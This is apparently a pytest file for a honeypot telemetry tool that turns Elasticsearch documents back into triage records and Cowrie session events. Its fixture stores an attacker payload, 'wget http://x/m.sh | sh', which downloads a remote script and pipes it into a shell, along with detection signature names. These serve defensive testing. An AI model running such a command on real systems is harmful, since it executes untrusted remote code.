"""Rebuilding records from indexed documents."""

from __future__ import annotations

from datetime import datetime, timezone

from deception_shield.es_client import TelemetryStore, document_to_cowrie_event, document_to_record
from deception_shield.models import TriageBand


def indexed_document(**overrides) -> dict:
    document = {
        "@timestamp": "2026-09-20T12:00:00Z",
        "source": {"ip": "203.0.113.5", "port": 44444},
        "destination": {"ip": "10.90.0.5", "port": 80},
        "network": {"transport": "tcp", "protocol": "HTTP"},
        "observer": {"name": "sensor-0"},
        "payload_hex": b"wget http://x/m.sh | sh".hex(),
        "threat": {
            "payload_score": 70,
            "payload_signatures": ["remote_payload_fetch", "shell_pipe_execution"],
            "triage": "likely-malicious",
        },
    }
    document.update(overrides)
    return document


class TestDocumentToRecord:
    def test_round_trips_the_core_fields(self) -> None:
        record = document_to_record(indexed_document())
        assert record is not None
        assert record.source_ip == "203.0.113.5"
        assert record.destination_port == 80
        assert record.payload == b"wget http://x/m.sh | sh"
        assert record.sensor_id == "sensor-0"

    def test_preserves_the_stored_verdict(self) -> None:
        """Scoring happened at ingest; re-deriving it here would risk drift."""
        record = document_to_record(indexed_document())
        assert record is not None
        assert record.score == 70
        assert record.triage is TriageBand.LIKELY_MALICIOUS

    def test_derives_the_band_when_absent(self) -> None:
        document = indexed_document(threat={"payload_score": 85})
        record = document_to_record(document)
        assert record is not None and record.triage is TriageBand.CRITICAL

    def test_falls_back_to_ascii_payload(self) -> None:
        document = indexed_document()
        del document["payload_hex"]
        document["payload_ascii"] = "GET /"
        record = document_to_record(document)
        assert record is not None and record.payload == b"GET /"

    def test_accepts_frame_time_when_timestamp_missing(self) -> None:
        document = indexed_document()
        del document["@timestamp"]
        document["frame_time"] = "2026-09-20T12:00:00+00:00"
        assert document_to_record(document) is not None

    def test_malformed_documents_return_none(self) -> None:
        """One bad document must not abort an analysis run."""
        assert document_to_record({}) is None
        assert document_to_record({"@timestamp": "not-a-date"}) is None
        assert document_to_record({"@timestamp": "2026-09-20T12:00:00Z", "source": {"port": "abc"}}) is None

    def test_missing_optional_fields_are_tolerated(self) -> None:
        record = document_to_record(
            {"@timestamp": "2026-09-20T12:00:00Z", "payload_ascii": "x"}
        )
        assert record is not None
        assert record.score == 0
        assert record.signatures == []



def indexed_cowrie(**overrides) -> dict:
    document = {
        "@timestamp": "2026-09-20T12:00:02.000Z",
        "eventid": "cowrie.command.input",
        "event": {"module": "cowrie", "dataset": "honeypot.session"},
        "session": {"id": "a1b2c3d4e5f6"},
        "source": {"ip": "203.0.113.7", "port": 51515},
        "destination": {"ip": "10.90.0.5", "port": 2222},
        "observer": {"name": "sensor-0"},
        "process": {"command_line": "uname -a"},
    }
    document.update(overrides)
    return document


class TestDocumentToCowrieEvent:
    def test_the_logstash_renames_are_reversed(self) -> None:
        event = document_to_cowrie_event(indexed_cowrie(user={"name": "root", "password": "admin"}))
        assert event == {
            "eventid": "cowrie.command.input",
            "timestamp": "2026-09-20T12:00:02.000Z",
            "session": "a1b2c3d4e5f6",
            "sensor": "sensor-0",
            "src_ip": "203.0.113.7",
            "src_port": 51515,
            "dst_ip": "10.90.0.5",
            "dst_port": 2222,
            "username": "root",
            "password": "admin",
            "input": "uname -a",
        }

    def test_an_observer_written_twice_is_read_once(self) -> None:
        twice = {"name": ["sensor-0", "sensor-0"]}
        assert document_to_cowrie_event(indexed_cowrie(observer=twice))["sensor"] == "sensor-0"

    def test_documents_missing_the_essentials_are_skipped(self) -> None:
        assert document_to_cowrie_event({"eventid": "cowrie.command.input"}) is None
        assert document_to_cowrie_event(indexed_cowrie(session={})) is None


class FakeCluster:
    """Answers the two passes: command events, then every event of those sessions."""

    def __init__(self, documents: list[dict]) -> None:
        self.documents = documents
        self.queries: list[dict] = []

    def search(self, index: str, body: dict) -> dict:
        self.queries.append(body["query"])
        if "search_after" in body:
            return {"hits": {"hits": []}}
        clauses = body["query"]["bool"]["must"]
        wanted_ids = next((c["terms"]["session.id"] for c in clauses if "terms" in c), None)
        if wanted_ids is None:
            hits = [d for d in self.documents if d["eventid"] == "cowrie.command.input"]
        else:
            hits = [d for d in self.documents if d["session"]["id"] in wanted_ids]
        return {"hits": {"hits": [{"_source": d, "sort": [i]} for i, d in enumerate(hits)]}}


def test_session_events_are_fetched_in_two_passes() -> None:
    documents = [
        indexed_cowrie(eventid="cowrie.login.success", user={"name": "root"}, process=None),
        indexed_cowrie(),
        indexed_cowrie(eventid="cowrie.login.failed", session={"id": "nocommands"}, process=None),
    ]
    store = TelemetryStore()
    store._client = FakeCluster(documents)
    events = list(store.fetch_session_events(since=datetime(2026, 9, 1, tzinfo=timezone.utc)))
    assert [e["eventid"] for e in events] == ["cowrie.login.success", "cowrie.command.input"]
    assert {"terms": {"session.id": ["a1b2c3d4e5f6"]}} in store._client.queries[-2]["bool"]["must"]
